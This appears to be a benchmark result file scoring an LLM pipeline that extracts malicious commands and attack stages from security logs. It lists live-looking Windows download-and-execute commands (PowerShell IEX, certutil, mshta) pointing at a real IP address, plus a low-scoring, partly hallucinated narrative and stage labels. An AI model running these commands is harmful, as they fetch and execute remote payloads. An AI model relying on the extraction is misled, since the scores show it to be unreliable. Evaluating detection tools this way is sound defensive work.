@@ -1,0 +1,86 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\\u0443\u02bc\\\u0512\\[..]\\B.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cscript.exe   /e:VBScript.Encode T1059.007.vbs",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powercfg.exe /batteryreport /output battery-report.html",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The attacker used various techniques such as certificate utilization, PowerShell scripts, HTA files, VBscript encoding, and web requests to execute commands remotely on the victim's machine, gather information, and evade detection. The attacks were launched using URLs hosted on an IP address associated with known threat actor infrastructure.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 236890,
+      "completion_tokens": 2768,
+      "total_tokens": 239658,
+      "wall_clock_s": 29.393,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.3333333333333333,
+      "recall": 0.07894736842105263,
+      "f1": 0.12765957446808512,
+      "tp": 3,
+      "fp": 6,
+      "fn": 35
+    },
+    "stage": {
+      "precision": 0.2222222222222222,
+      "recall": 0.05263157894736842,
+      "f1": 0.0851063829787234,
+      "tp": 2,
+      "fp": 7,
+      "fn": 36,
+      "recall_partial": 0.04054054054054054
+    },
+    "hallucination_rate": 0.3076923076923077,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 236890,
+      "completion_tokens": 2768,
+      "total_tokens": 239658,
+      "wall_clock_s": 29.393,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
